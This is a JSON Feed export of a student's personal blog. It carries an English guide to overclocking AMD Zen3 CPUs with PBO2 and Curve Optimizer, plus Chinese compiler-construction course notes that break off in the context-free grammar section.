{
    "version": "https://jsonfeed.org/version/1",
    "title": "Cubic YÂ³",
    "description": "Notes, CTF, DIY, thoughts and waifus.\n\nI'm CubicYYY, an undergraduate student majoring in Computer Science at Zhejiang University.\nLearning: Electric guitar\nâ¤â¤â¤ CTF, toy projects, anime\nâœ–âœ–âœ– Technological supremacy\nResume is [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/resume&target=resume.tex&command=xelatex).",
    "home_page_url": "http://cubicy.icu",
    "items": [
        {
            "id": "http://cubicy.icu/overclocking-zen3/",
            "url": "http://cubicy.icu/overclocking-zen3/",
            "title": "Overclocking AMD Zen3 with PBO2 Done Right FULL GUIDE",
            "date_published": "2024-04-26T17:36:26.000Z",
            "content_html": "<h1 id=\"Overclocking-AMD-Zen3-Series-with-PBO2-Ryzen-5600X-5800X-5900X-5950X-overclocking\"><a href=\"#Overclocking-AMD-Zen3-Series-with-PBO2-Ryzen-5600X-5800X-5900X-5950X-overclocking\" class=\"headerlink\" title=\"Overclocking AMD Zen3 Series with PBO2: Ryzen 5600X&#x2F;5800X&#x2F;5900X&#x2F;5950X overclocking\"></a>Overclocking AMD Zen3 Series with PBO2: Ryzen 5600X&#x2F;5800X&#x2F;5900X&#x2F;5950X overclocking</h1><p>This guide aims to overclock Zen3 CPUs with Precision Boost Overdrive 2 (PBO2), gaining extra performance in the single-core score(about <strong>5% - 15%</strong>) while maintaining or even increasing the multi-core score. The solution may also apply to the Zen4 series, but the args cannot be a valid reference.</p>\n<h2 id=\"Before-the-overclocking\"><a href=\"#Before-the-overclocking\" class=\"headerlink\" title=\"Before the overclocking\"></a>Before the overclocking</h2><h3 id=\"Mindset\"><a href=\"#Mindset\" class=\"headerlink\" title=\"Mindset\"></a>Mindset</h3><p>Zen3 series is super hot, so you lower the voltage, lower the temperature, and more performance can be obtained under the temperature limit. The heat gets heavily trapped inside the chip, so <strong>a good cooler can help a lot!</strong><br>Ideal idle temperature: 40-60 Celsius</p>\n<p>Although <strong>you always overclock with your risks</strong>, hereâ€™s a point worth mentioning: <strong>PBO2 itself is SAFE,</strong> since it never actually changes the voltage for different cores under different frequencies(the CPU requires a voltage from the motherboard, so it physically cannot allocate different voltage for each core precisely). Instead, it changes the frequency of each core under a certain voltage (i.e. changes the frequency-voltage <em>curve</em>)! Weâ€™ll see how to adjust the <em>curve</em> later.</p>\n<p><strong>Note: Even though itâ€™s not the voltage that changes, we still use the term â€œincrease&#x2F;decrease voltageâ€ in this article because itâ€™s easier to understand.</strong></p>\n<p>What we need to spend time adjusting:</p>\n<ul>\n<li>EDC</li>\n<li>Curve Optimizer</li>\n<li>CPU Offset Voltage (if needed)</li>\n</ul>\n<h3 id=\"Know-the-quality-of-your-chip-Optional\"><a href=\"#Know-the-quality-of-your-chip-Optional\" class=\"headerlink\" title=\"Know the quality of your chip (Optional)\"></a>Know the quality of your chip (Optional)</h3><p>A specific CPU chip has its <em>quality</em>, indicating the potential performance gain from overclocking. If you are using an ASUS motherboard, try this before the overclocking to know your silicon quality: <a href=\"https://www.cybermania.ws/apps/amd-ryzen-silicon-tester-amd-v-f/\">AMD Ryzen Silicon Tester (AMD V&#x2F;F)</a>. Remember to have everything in <strong>default(no overclocking, no PBO2).</strong> and have as few background tasks as possible.<br>Reference table:</p>\n<table>\n<thead>\n<tr>\n<th>Score</th>\n<th>Quality</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&lt;110</td>\n<td>Bad</td>\n</tr>\n<tr>\n<td>110-115</td>\n<td>Normal</td>\n</tr>\n<tr>\n<td>115-125</td>\n<td>Good</td>\n</tr>\n<tr>\n<td>&gt;125</td>\n<td>Excellent</td>\n</tr>\n</tbody></table>\n<h3 id=\"All-in-One-Solution-Optional\"><a href=\"#All-in-One-Solution-Optional\" class=\"headerlink\" title=\"All in One Solution (Optional)\"></a>All in One Solution (Optional)</h3><p>If you are finding good initial values for tweaking (or even only use args generated by an automatic tool), have a look â†’ <a href=\"https://www.techpowerup.com/download/amd-ryzen-clock-tuner-ctr-1usmus/\">Clock Tuner</a></p>\n<h3 id=\"Software-Tools-to-Prepare\"><a href=\"#Software-Tools-to-Prepare\" class=\"headerlink\" title=\"Software&#x2F;Tools to Prepare\"></a>Software&#x2F;Tools to Prepare</h3><ul>\n<li><a href=\"https://github.com/sp00n/corecycler/releases/tag/v0.9.4.2\">Corecycler</a> (To test the stability of your overclock settings)</li>\n<li>AMD Ryzen Master (provided by the AMD)</li>\n<li>CPU-Z or other benchmark tools</li>\n</ul>\n<h2 id=\"Detailed-Steps\"><a href=\"#Detailed-Steps\" class=\"headerlink\" title=\"Detailed Steps\"></a>Detailed Steps</h2><p>Platform used: ASUS TUF B550M</p>\n<h3 id=\"Set-BIOS-args\"><a href=\"#Set-BIOS-args\" class=\"headerlink\" title=\"Set BIOS args\"></a>Set BIOS args</h3><p>Reboot and enter the BIOS, hereâ€™s some key settings. The actual path may vary from different motherboards&#x2F;BIOS. So if an item cannot be found after your carefully searching, just ignore it.</p>\n<ul>\n<li>Ai Overclock Tuner: Manual or DOCP if XMP for the RAM enabled</li>\n<li>Performance Enhancement: ALWAYS OFF.</li>\n<li>Spread Spectrum: ALWAYS OFF.<ul>\n<li><img src=\"/overclocking-zen3/DOCP.png\" loading=\"lazy\"></li>\n</ul>\n</li>\n<li>CPU Core Ratio: <code>Auto</code><ul>\n<li>May change to offset mode if you need to. Continue reading for details<br> <img src=\"/overclocking-zen3/cpu-voffset.jpg\" alt=\"CPU Voltage\" loading=\"lazy\"></li>\n</ul>\n</li>\n<li>Ai Tweaker&#x2F;DIGI+ VRM<ul>\n<li>VDDCR CPU Current Capability: <code>130%</code> or <code>140%</code> or more, as high as possible</li>\n<li>VDDCR SOC Current Capability (if exists, maybe in a different path): <code>130%</code> or <code>140%</code> or more, as high as possible</li>\n<li>Loadline Calibration: ALL <code>Auto</code> . Itâ€™s almost meaningless to change it unless you have a fixed frequency and CPU voltage, or you always get BSoD after every try in PBO2.</li>\n<li>Set all other options to <code>Extreme</code> if possible<br> <img src=\"/overclocking-zen3/DIGI-VRM.jpg\" alt=\"DIGI+ VRM\" loading=\"lazy\"></li>\n</ul>\n</li>\n<li>Advanced&#x2F;AMD CBS&#x2F;NBIO Common Options&#x2F;SMU Common Options<ul>\n<li>CPPC: ON! âˆšâˆšâˆš</li>\n<li>CPPC preferred cores: ON&#x2F;OFF, not sure. (I leave it ENABLED, but Windows scheduler sucks so it may make applications stuttery when switching between cores. Test it by yourself after everything is done, if you like!)<br> <img src=\"/overclocking-zen3/cppc.jpg\" alt=\"CPPC\" loading=\"lazy\"></li>\n</ul>\n</li>\n<li>Fmax Enhancer: ALWAYS OFF.</li>\n<li><strong>PBO settings under the â€œAi Tweakerâ€ tab (if exists): ALL <code>Auto</code> !</strong><ul>\n<li><img src=\"/overclocking-zen3/ai-tweaker-PBO.jpg\" loading=\"lazy\"></li>\n</ul>\n</li>\n<li>PBO settings under the â€œAdvancedâ€ tab:<ul>\n<li>Precision Boost Overdrive: <code>Manual</code></li>\n<li>PBO Limits: <code>Manual</code></li>\n<li>PPT&#x2F;TDC&#x2F;<strong>EDC</strong> (this is an important arg)<ul>\n<li>Reference for 5600X&#x2F;5800X: 350&#x2F;140&#x2F;160</li>\n<li>Reference for 5900X&#x2F;5950X: 350&#x2F;150&#x2F;190</li>\n<li>PPT makes little difference, set it to a reasonably high number (300 is enough, I take 350 here)</li>\n<li>TDC should be lower than EDC about 20~45.</li>\n<li><strong>EDC is important!</strong> If it is too low, not enough energy to feed the chip; if it is too high, the PBO2 algorithm can be extremely aggressive so the CPU is always thermal throttling, leading to worse performance. For 5600X&#x2F;5800X, it is about 150~170; for 5900X&#x2F;5950X, it is about 170~210. Test different values until you find that the frequency reached a maximum during CPU-Z all-core testing.</li>\n</ul>\n</li>\n<li>PBO Scalar: Manual &#x2F; 10X (If your cooler sucks, make this arg lower)</li>\n<li>Max CPU Boost Clock Override: 200MHz (If your cooler sucks, make this arg lower too)</li>\n<li>Thermal limit: auto or a high value. This arg can only lower the temperature limit set by the manufacturer, so it makes no difference</li>\n<li><strong>Curve Optimizer: Per Core, and the NEGATIVE values for each core are all we have to determine in the next step. Leave it all 0 now.</strong><br> <img src=\"/overclocking-zen3/advanced-PBO.jpg\" alt=\"Advanced PBO\" loading=\"lazy\"></li>\n</ul>\n</li>\n<li>Advanced&#x2F;CPU Configuration&#x2F;PSS Support: ON! With some cores sleeping, the working cores can boost more since the chip is cooler.<ul>\n<li><img src=\"/overclocking-zen3/pss.jpg\" loading=\"lazy\"></li>\n</ul>\n</li>\n<li>Advanced&#x2F;AMD CBS&#x2F;Global C-State Control: ON! For the same reason.<ul>\n<li><img src=\"/overclocking-zen3/C-state.jpg\" loading=\"lazy\"></li>\n</ul>\n</li>\n</ul>\n<p><code>F10</code> or the key to save the BIOS setting and enter the system to ensure your settings work.</p>\n<h3 id=\"Curve-Optimizer-Downvoltaging\"><a href=\"#Curve-Optimizer-Downvoltaging\" class=\"headerlink\" title=\"Curve Optimizer: Downvoltaging\"></a>Curve Optimizer: Downvoltaging</h3><p><strong>The key idea: lower the voltage curve (for each frequency) to have more thermal and power space for boosting.</strong><br>So we need negative values here.<br>(We say <code>-25</code> is more negative than <code>-20</code>, so you know â€œmake the value more negativeâ€ will make a negative number even further from zero)</p>\n<ol>\n<li><p>Enter the system, open the Ryzen Master, check for the 1st and 2nd fastest core, and remember the core number (start from 1. e.g. #1 and #5) <img src=\"/overclocking-zen3/fastest-cores.png\" loading=\"lazy\"></p>\n</li>\n<li><p>Restart and enter the BIOS, find <code>Advanced/PBO/Curve Optimizer</code> or another path if you are using a different motherboard</p>\n</li>\n<li><p>Set all the cores to negative <code>-30</code> (if your chip score is not so good, set it to <code>-25</code> or something) except for the 1st and 2nd fastest core.</p>\n</li>\n<li><p>For the 1st and 2nd fastest core(numbers start from 0 in many BIOS, in that case, please do a trivial convert for the number. e.g. #1-&gt;#0 and #5-&gt;#4), set the value to <code>-25</code>(if your chip score is not so good, set it to <code>-20</code> or something): they need higher voltage to boost higher.</p>\n</li>\n<li><p>Apply changes and restart, try to enter the system and check stability:</p>\n<ul>\n<li>Unstable - Can even not enter the system: make the value less negative (increase the voltage) of all cores</li>\n<li>Unstable - Entered the system and got BSoD: Restart and try to finish these steps before a BSoD again:<ol>\n<li>Open the Windows Event Viewer, go to System, and look for errors from WHEA-logger with ID&#x3D;18.</li>\n<li>If found, check the APIC ID in detail. APIC ID is the number of the logic core that failed, so you need to convert it into physical core number. For example, my 5800X has 2 threads per core, so APIC ID 9 means physical CPU core #floor(9&#x2F;2)&#x3D;#4 (start from #0) failed. <img src=\"/overclocking-zen3/WHEA18.png\" loading=\"lazy\"></li>\n<li>Restart and enter the BIOS, make the value less negative (increase the voltage) of this specific core</li>\n</ol>\n</li>\n<li>Unstable - Start a fast verification using CoreCycler(with <code>config.ini</code> args set to runtimePerCore&#x3D;60, maxIterations&#x3D;3), but failed: make the value less negative (increase the voltage) of cores reporting errors<ul>\n<li>You can check the log files: <img src=\"/overclocking-zen3/Corecycler-error-log.png\" loading=\"lazy\"> <img src=\"/overclocking-zen3/Corecycler-error-log2.png\" loading=\"lazy\"></li>\n</ul>\n</li>\n<li>Everything is ok and the CoreCycler test passed: can be more aggressive, make the value more negative (decrease the voltage) of all cores by a small value (e.g. <code>5</code> or <code>3</code> or <code>1</code>, up to you)<ul>\n<li>Tips: If you hit the minimum value (typically <code>-30</code>) that you can set in Curve Optimizer, but you still want to dig deeper, then you can change <code>VDDCR CPU Voltage</code> from <code>Auto</code> to <code>Offset</code>, and set negative values for your CPU. In this way, you can decrease the CPU voltage (globally) even more when combined with the Curve Optimizer downvoltaging.</li>\n<li>Note: If your chip sucks, you may even need to set some cores working at <em>positive</em> values (higher voltage than default)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Repeat step 5 until you find the best args!</p>\n</li>\n</ol>\n<p>My results (5800X): <code>-15</code> for the fastest 2 cores and <code>-28</code>~<code>-30</code> for others; CPU voltage offset <code>-0.04375</code><br><img src=\"/overclocking-zen3/curve.jpg\" alt=\"Curve Optimizer\" loading=\"lazy\"><br>CPU-Z Score:</p>\n<ul>\n<li>Single-core&#x3D; 678.0</li>\n<li>Multi-cores&#x3D; 6823.6</li>\n</ul>\n<h3 id=\"Verify-Stability\"><a href=\"#Verify-Stability\" class=\"headerlink\" title=\"Verify Stability\"></a>Verify Stability</h3><p>If the following condition is met, then you made it!</p>\n<ul>\n<li>Leave the computer idle (low workload), and open a webpage normally</li>\n<li>Run Corecycler for like 4 hours with no errors:<ul>\n<li>runtimePerCore &#x3D; 360</li>\n<li>maxIterations &#x3D; 10000</li>\n<li><img src=\"/overclocking-zen3/Corecycler.png\" loading=\"lazy\"></li>\n</ul>\n</li>\n<li>Run CPU-Z for a score!</li>\n<li>Run a benchmark tool and see the args changing on the Ryzen Master panel</li>\n<li>Play a game or do what you want without BSoD and WHEA 18 event in your event viewer</li>\n</ul>\n<p>If any error occurrs, you know what to do from the paragraph above: increase the voltage.</p>\n<h2 id=\"References\"><a href=\"#References\" class=\"headerlink\" title=\"References\"></a>References</h2><p>[Chinese]<a href=\"https://www.bilibili.com/video/BV15b4y1R7EV/\">AMD RYZEN5000ç³»åˆ—ä½“è´¨æµ‹è¯•å·¥å…·åˆ†äº«</a><br>[Chinese]<a href=\"https://www.bilibili.com/read/cv16285050/\">5800X PBOå’ŒCurve Optimizerçš„æµ‹è¯•ä¸ä¼˜åŒ–</a><br>[Chinese]<a href=\"https://www.bilibili.com/read/cv13796433/\">AMD 5000ç³»Ryzenå¹³å°é”é¾™å¤„ç†å™¨ å…¨é¢è¶…é¢‘å¿«é€Ÿè°ƒæ•™æŒ‡å—</a><br>[Chinese]<a href=\"https://www.bilibili.com/read/cv10267893/\">å…³äºEDCå¯¹Ryzen5000ç³»åˆ—CPUæ•ˆèƒ½çš„å½±å“</a><br><a href=\"https://www.youtube.com/watch?v=QCyZ-QYwsFY\">AMD. Whatâ€™s New with Precision Boost Overdrive 2.</a></p>\n",
            "tags": [
                "English",
                "Overclocking"
            ]
        },
        {
            "id": "http://cubicy.icu/compiler-construction-principles/",
            "url": "http://cubicy.icu/compiler-construction-principles/",
            "title": "ç¼–è¯‘åŸç†è¯¾ç¨‹ç¬”è®°ï¼ˆAll-in-Oneé€Ÿé€šç‰ˆï¼‰",
            "date_published": "2024-04-13T17:10:20.000Z",
            "content_html": "<h1 id=\"ç¼–è¯‘åŸç†Speed-run-any\"><a href=\"#ç¼–è¯‘åŸç†Speed-run-any\" class=\"headerlink\" title=\"ç¼–è¯‘åŸç†Speed-run any%\"></a>ç¼–è¯‘åŸç†<code>Speed-run any%</code></h1><p>ä»¥<strong>å¿«é€Ÿå¤ä¹ </strong>ä¸ºç›®çš„ã€‚<br>æ–‡ä¸­éƒ¨åˆ†å›¾ç‰‡ä¸æ–‡å­—æ¥è‡ªäºå§šè€å¸ˆ(ZJU, pyaoaa at zju.edu.cn)</p>\n<h2 id=\"Part-0-è¯¾ç¨‹ä¿¡æ¯\"><a href=\"#Part-0-è¯¾ç¨‹ä¿¡æ¯\" class=\"headerlink\" title=\"Part 0: è¯¾ç¨‹ä¿¡æ¯\"></a>Part 0: è¯¾ç¨‹ä¿¡æ¯</h2><p>ä½¿ç”¨æ•™æï¼š<em>Modern Compiler Implementation in C</em>, Andrew W. Appel ï¼ˆA.K.A è™ä¹¦ï¼‰</p>\n<p>ç›¸å…³è¯¾ç¨‹ï¼š</p>\n<ul>\n<li><a href=\"http://web.stanford.edu/class/cs143/\">Stanfordè¯¾ç¨‹ä¸»é¡µ</a></li>\n<li><a href=\"https://github.com/6035/sp21\">MITè¯¾ç¨‹ä¸»é¡µ</a></li>\n<li><a href=\"https://inst.eecs.berkeley.edu/~cs164/fa21/\">UCBerkeleyè¯¾ç¨‹ä¸»é¡µ</a></li>\n</ul>\n<p>åˆ†æ•°æ„æˆï¼š</p>\n<ul>\n<li>è¯¾ç¨‹ä½œä¸š(è¯¾åå°å‹ç»ƒä¹ é¢˜) &#x3D; 10%</li>\n<li>éšå ‚æµ‹éªŒ&#x3D; 10%</li>\n<li>æœŸä¸­è€ƒè¯•&#x3D; 15%</li>\n<li>ç»¼åˆæ€§è¯¾ç¨‹è®¾è®¡&#x3D; 25%</li>\n<li>æœŸæœ«è€ƒè¯•&#x3D; 40% ï¼ˆæ–©æ€çº¿40&#x2F;100ï¼‰</li>\n</ul>\n<p>å‰ç½®çŸ¥è¯†ï¼šè®¡ç®—ç†è®ºï¼ˆç¬”è®°å‚è€ƒ<a href=\"https://note.tonycrane.cc/cs/tcs/toc/\">https://note.tonycrane.cc/cs/tcs/toc/</a>ï¼‰</p>\n<h2 id=\"Part-1-ç®€ä»‹\"><a href=\"#Part-1-ç®€ä»‹\" class=\"headerlink\" title=\"Part 1: ç®€ä»‹\"></a>Part 1: ç®€ä»‹</h2><p>åŸºæœ¬æ¦‚å¿µï¼š</p>\n<ul>\n<li>ä¸­é—´ä»£ç &#x3D;Intermediate Code</li>\n<li>è¯æ³•åˆ†æ&#x3D;Lexing&#x2F;Scanning&#x2F;LexicalAnalysis</li>\n<li>è¯­æ³•åˆ†æ&#x3D;Parsing&#x2F;SyntaxAnalysis</li>\n<li>ä¸­é—´è¡¨ç¤º&#x3D;IR&#x3D;Intermediate Representation</li>\n<li>æ ‘å‹ä¸­é—´è¡¨ç¤º&#x3D;IR Tree</li>\n<li>å‰ç«¯ï¼Œåç«¯<br>ç•¥ã€‚</li>\n</ul>\n<h2 id=\"Part-2-è¯æ³•åˆ†æ\"><a href=\"#Part-2-è¯æ³•åˆ†æ\" class=\"headerlink\" title=\"Part 2: è¯æ³•åˆ†æ\"></a>Part 2: è¯æ³•åˆ†æ</h2><h3 id=\"è¯æ³•åˆ†ææ¦‚è¿°\"><a href=\"#è¯æ³•åˆ†ææ¦‚è¿°\" class=\"headerlink\" title=\"è¯æ³•åˆ†ææ¦‚è¿°\"></a>è¯æ³•åˆ†ææ¦‚è¿°</h3><p>å°†è¾“å…¥å­—ç¬¦ä¸²è¯†åˆ«ä¸ºæœ‰æ„ä¹‰çš„å­ä¸²ã€‚ï¼ˆæŠŠåŸºæœ¬å•å…ƒåˆ’åˆ†å¥½ï¼‰<br>(Tokenå•è¯, Lexemeè¯ç´ (å¯é€‰)) e.g. (IF, ) (ELSE, ) (BINARY_OP, &gt;&#x3D;) (UNARY_OP, &amp;)</p>\n<h3 id=\"æ­£åˆ™è¡¨è¾¾å¼\"><a href=\"#æ­£åˆ™è¡¨è¾¾å¼\" class=\"headerlink\" title=\"æ­£åˆ™è¡¨è¾¾å¼\"></a>æ­£åˆ™è¡¨è¾¾å¼</h3><p>Regex Expression &#x3D; RE<br>è¿ç®—ï¼šè¿æ¥concatenation + å¹‚Power<br>e.g.: $ ab(a|b)^3c^* $<br>ä¸‹ç•¥ã€‚</p>\n<h3 id=\"æœ‰ç©·è‡ªåŠ¨æœº\"><a href=\"#æœ‰ç©·è‡ªåŠ¨æœº\" class=\"headerlink\" title=\"æœ‰ç©·è‡ªåŠ¨æœº\"></a>æœ‰ç©·è‡ªåŠ¨æœº</h3><p>ç›¸å…³æ¦‚å¿µï¼š</p>\n<ul>\n<li><p>NFA&#x2F;DFAï¼šç•¥</p>\n</li>\n<li><p>å­é›†æ„é€ æ³•subsetconstruction(NFA-&gt;DFA)</p>\n<ul>\n<li>DFAçš„æ¯ä¸ªçŠ¶æ€æ˜¯NFAçš„çŠ¶æ€é›†åˆçš„ä¸€ä¸ªå­é›†</li>\n<li>è¯»äº†è¾“å…¥aiåNFAèƒ½åˆ°è¾¾çš„æ‰€æœ‰çŠ¶æ€ï¼šs1,s2,â€¦,skï¼Œåˆ™DFAåˆ°è¾¾ä¸€ä¸ªçŠ¶æ€ï¼Œå¯¹åº”äºNFAçš„{s1,s2,â€¦,sk}</li>\n<li>NFAçŠ¶æ€(é›†)ä¸Šçš„ä¸€äº›æ“ä½œå®šä¹‰<ul>\n<li>Îµ-closure(s):&#x3D; NFAçŠ¶æ€sçš„Îµ-é—­åŒ…&#x3D;sç»Îµè½¬æ¢æ‰€èƒ½åˆ°è¾¾çš„çŠ¶æ€é›†åˆ</li>\n<li>Îµ-closure(T):&#x3D; Tä¸­æ‰€æœ‰çŠ¶æ€çš„Îµ-é—­åŒ…çš„å¹¶é›†,å³ $ \\cup_{s\\in T}{\\epsilon-closure(s)} $</li>\n</ul>\n</li>\n<li>è¿‡ç¨‹<ol>\n<li>NFAçš„åˆå§‹çŠ¶æ€Sçš„Îµ-é—­åŒ…å¯¹åº”äºDFAçš„åˆå§‹çŠ¶æ€</li>\n<li>é’ˆå¯¹æ¯ä¸ªDFAçŠ¶æ€(å¯¹åº”NFAçŠ¶æ€å­é›†A)ï¼Œæ±‚è¾“å…¥æ¯ä¸ªå¯èƒ½è¾“å…¥aiåèƒ½åˆ°è¾¾çš„NFAçŠ¶æ€çš„Îµ-é—­åŒ…å¹¶é›†ï¼ˆNFAä»çŠ¶æ€é›†Aå‡ºå‘ï¼Œè¯»å…¥aiåèƒ½åˆ°è¾¾çš„çŠ¶æ€é›†åˆï¼‰ $$ S&#x3D;\\epsilon-closure(move(A,a_i)) $$</li>\n<li>è¯¥é›†åˆSè¦ä¹ˆå¯¹åº”äºDFAä¸­çš„ä¸€ä¸ªå·²æœ‰çŠ¶æ€ï¼Œè¦ä¹ˆä»¤å…¶æˆä¸ºä¸€ä¸ªæ–°åŠ çš„DFAçŠ¶æ€</li>\n<li>é‡å¤ä¸Šè¿°ä¸¤æ­¥ï¼Œé€æ­¥æ„é€ DFAçš„çŠ¶æ€è½¬æ¢è¡¨ï¼ˆæ¯ä¸ªçŠ¶æ€é›†åˆSä¸æ¯ä¸ªè¾“å…¥aiï¼‰ï¼Œç›´åˆ°ä¸åŠ¨ç‚¹ï¼ˆä¸å†æ–°å¢çŠ¶æ€ï¼Œä¸”çŠ¶æ€è½¬ç§»è¡¨å®Œå…¨æ±‚å‡ºï¼Œå³å¯¹ä»»ä¸€çŠ¶æ€é›†åˆSå·²çŸ¥åˆ†åˆ«æ¥å—æ‰€æœ‰è¾“å…¥aiå°†åˆ†åˆ«è½¬ç§»åˆ°ä½•çŠ¶æ€ï¼‰</li>\n<li>åœ¨DFAä¸­ï¼Œåªè¦çŠ¶æ€é›†åˆSåŒ…å«è‡³å°‘ä¸€ä¸ªåŸæ¥NFAä¸­çš„ç»ˆæ­¢çŠ¶æ€ï¼Œå°±æŠŠSæ ‡è®°ä¸ºç»ˆæ­¢çŠ¶æ€</li>\n</ol>\n</li>\n<li>ç¤ºä¾‹ï¼ˆTODOï¼‰<ul>\n<li><img src=\"/compiler-construction-principles/nfa2dfa.png\" alt=\"nfa2dfa\" loading=\"lazy\"></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Thumpsonæ„é€ æ³•(RE-&gt;NFA)ï¼šç•¥</p>\n</li>\n</ul>\n<h3 id=\"è¯æ³•åˆ†æå™¨è‡ªåŠ¨ç”Ÿæˆ\"><a href=\"#è¯æ³•åˆ†æå™¨è‡ªåŠ¨ç”Ÿæˆ\" class=\"headerlink\" title=\"è¯æ³•åˆ†æå™¨è‡ªåŠ¨ç”Ÿæˆ\"></a>è¯æ³•åˆ†æå™¨è‡ªåŠ¨ç”Ÿæˆ</h3><ul>\n<li>DFAæœ€å°åŒ–ï¼ˆ-&gt;çŠ¶æ€æœ€å°çš„DFAï¼Œåœ¨åŒæ„æ„ä¹‰ä¸‹å”¯ä¸€ï¼‰</li>\n<li>å¯åŒºåˆ†çŠ¶æ€ï¼šå­˜åœ¨ä¸²sä½¿å…¶åˆ†åˆ«ä»çŠ¶æ€sã€tå‡ºå‘ï¼Œä¸€ä¸ªæ¥å—ä¸²sï¼Œä¸€ä¸ªæ‹’ç»ä¸²sï¼Œåˆ™sä¸tå¯åŒºåˆ†</li>\n<li>æ­¥éª¤ï¼š<ol>\n<li>åˆå§‹ç­‰ä»·ç±»ï¼Œä»…ç”±æ¥å—çŠ¶æ€é›†åˆå’Œéæ¥å—çŠ¶æ€ä¸¤ä¸ªé›†åˆæ„æˆ</li>\n<li>ç”¨æ‰€æœ‰å¯èƒ½çš„è¾“å…¥aiåº”ç”¨äºå„ä¸ªé›†åˆï¼ˆèµ°ä¸€æ­¥ï¼‰<ul>\n<li>åªæœ‰é›†åˆGçš„æ¯ä¸ªçŠ¶æ€è¯»å…¥åŒä¸€å­—ç¬¦åï¼Œéƒ½è½å…¥ï¼ˆåŒ…å«åœ¨ï¼‰ç›¸åŒçš„æŸä¸ªé›†åˆï¼Œè¯¥é›†åˆGåœ¨è¿™ä¸€æ­¥æ‰ä¸ç”¨ç»†åˆ†</li>\n<li>å¦åˆ™é›†åˆGè¦è¢«ç»†åˆ†ï¼šè½å…¥ä¸åŒé›†åˆçš„å¯¹åº”çŠ¶æ€éœ€è¦è¢«åˆ†å‰²è¿›ä¸åŒé›†åˆ</li>\n</ul>\n</li>\n<li>ä¸æ–­é‡å¤2ç›´åˆ°ä¸åŠ¨ç‚¹ï¼ˆä»»ä¸€é›†åˆåˆ†åˆ«å¯¹æ‰€æœ‰è¾“å…¥aiéƒ½ä¸å¯ç»†åˆ†ï¼‰</li>\n<li>æ­¤æ—¶ç­‰ä»·ç±»ä¸­çš„æ¯ä¸ªé›†åˆå³å¯¹åº”æœ€å°DFAçš„ä¸€ä¸ªçŠ¶æ€ã€‚åœ¨å…¶ä¸Šå¯ä»¥è½»æ¾æ„å»ºmin-DFAï¼Œè¯¥è¿‡ç¨‹æ˜¯trivialçš„ï¼ˆå¯ä»¥æ¯ä¸ªç»„ä¸­é€‰æ‹©ä¸€ä¸ªçŠ¶æ€ä½œä»£è¡¨ï¼‰ã€‚</li>\n</ol>\n</li>\n<li>ç¤ºä¾‹ï¼ˆTODOï¼‰<ul>\n<li><img src=\"/compiler-construction-principles/DFA-simplify-diverge.png\" alt=\"DFA-simplify-diverge\" loading=\"lazy\"></li>\n<li><img src=\"/compiler-construction-principles/DFA-simplify.png\" alt=\"DFA-simplify\" loading=\"lazy\"></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Lexå·¥å…·\"><a href=\"#Lexå·¥å…·\" class=\"headerlink\" title=\"Lexå·¥å…·\"></a>Lexå·¥å…·</h3><p>é€šå¸¸å’ŒYaccä¸€èµ·ä½¿ç”¨ï¼Œç”Ÿæˆç¼–è¯‘å™¨çš„å‰ç«¯ã€‚</p>\n<ul>\n<li>å£°æ˜éƒ¨åˆ†<ul>\n<li>å¸¸é‡ï¼šå¸¸æ•°æ ‡è¯†ç¬¦</li>\n<li>æ­£åˆ™è§„åˆ™å®šä¹‰</li>\n</ul>\n</li>\n<li>è½¬æ¢è§„åˆ™æ¨¡å¼{åŠ¨ä½œ}<ul>\n<li>æ¨¡å¼&#x3D;æ­£åˆ™è¡¨è¾¾å¼</li>\n<li>åŠ¨ä½œ&#x3D;è¯†åˆ«åˆ°ç›¸åº”æ¨¡å¼æ—¶åº”è°ƒç”¨çš„å¤„ç†å‡½æ•°ï¼ˆä¸€èˆ¬ä»¥Cè¯­è¨€ä»£ç è¡¨ç¤ºï¼‰</li>\n</ul>\n</li>\n<li>è¾…åŠ©å‡½æ•°ï¼šåŠ¨ä½œä¸­ä½¿ç”¨çš„å‡½æ•°</li>\n</ul>\n<p>è§£å†³å†²çªï¼šæœ€é•¿åŒ¹é…ï¼Œè¾ƒå‰è§„åˆ™ä¼˜å…ˆ</p>\n<h2 id=\"Part-3-è¯­æ³•åˆ†æ-CFG-Parsing\"><a href=\"#Part-3-è¯­æ³•åˆ†æ-CFG-Parsing\" class=\"headerlink\" title=\"Part 3: è¯­æ³•åˆ†æ - CFG &amp; Parsing\"></a>Part 3: è¯­æ³•åˆ†æ - CFG &amp; Parsing</h2><h3 id=\"è¯­æ³•åˆ†æå™¨æ¦‚è¿°\"><a href=\"#è¯­æ³•åˆ†æå™¨æ¦‚è¿°\" class=\"headerlink\" title=\"è¯­æ³•åˆ†æå™¨æ¦‚è¿°\"></a>è¯­æ³•åˆ†æå™¨æ¦‚è¿°</h3><p>ä»è¯æ³•åˆ†æå™¨è·å¾—Tokenåºåˆ—ï¼Œç¡®è®¤è¯¥åºåˆ—æ˜¯å¦å¯ä»¥ç”±è¯­è¨€çš„æ–‡æ³•ç”Ÿæˆ</p>\n<ul>\n<li>å¯¹äºè¯­æ³•é”™è¯¯çš„ç¨‹åºï¼ŒæŠ¥å‘Šé”™è¯¯ä¿¡æ¯</li>\n<li>å¯¹äºè¯­æ³•æ­£ç¡®çš„ç¨‹åºï¼Œç”Ÿæˆè¯­æ³•åˆ†ææ ‘(ç®€ç§°è¯­æ³•æ ‘) e.g. æŠ½è±¡è¯­æ³•æ ‘AST</li>\n</ul>\n<p>å®ç°ï¼šæ‰‹åŠ¨ or è‡ªåŠ¨(ä½¿ç”¨Parse generator&#x3D;{Yacc, Bison, ANTLR, mehirâ€¦})</p>\n<h3 id=\"ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•CFG\"><a href=\"#ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•CFG\" class=\"headerlink\" title=\"ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•CFG\"></a>ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•CFG</h3><p>CFG &#x3D; Context Free Language</p>\n<p>$$ G&#x3D;(T,N,P,S) $$<br>Tï¼šç»ˆç»“ç¬¦é›†åˆ(Terminals)<br>Nï¼šéç»ˆç»“ç¬¦é›†åˆ(Non-terminals)<br>Pï¼šäº§ç”Ÿå¼é›†åˆ(Productions) $ A\\rightarrow a, A \\in N, a \\in (T \\cup 